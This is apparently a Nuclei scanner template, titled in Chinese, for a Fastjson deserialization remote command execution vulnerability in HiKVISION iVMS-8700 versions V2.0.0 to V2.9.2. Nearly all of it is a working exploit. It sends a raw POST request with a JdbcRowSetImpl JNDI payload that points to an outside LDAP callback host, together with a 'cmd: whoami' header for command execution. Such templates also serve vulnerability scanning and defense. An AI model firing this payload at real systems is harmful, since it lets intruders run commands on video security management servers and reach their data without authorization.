id: hikvision-isms-rce

info:
  name: "HiKVISION iVMS-8700 Fastjson 反序列化远程命令执行漏洞（V2.0.0-V2.9.2）"
  author: 0dayPoc
  severity: high
  description: |-
    iVMS-8700 安防管理系统在 V2.0.0 至 V2.9.2 版本中，其集成的 Fastjson 组件存在反序列化漏洞。攻击者可构造特制的 JSON 数据包，通过远程调用触发任意命令执行，最终实现对目标服务器的控制及敏感数据的非授权访问。
  tags: HiKVISION

http:
- raw:
  - |
    POST /bic/ssoService/v1/applyCT HTTP/1.1 
    Host: {{Hostname}}
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/json
    cmd: whoami

    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - '00215000'
  - type: word
    part: interactsh_protocol
    words:
      - dns
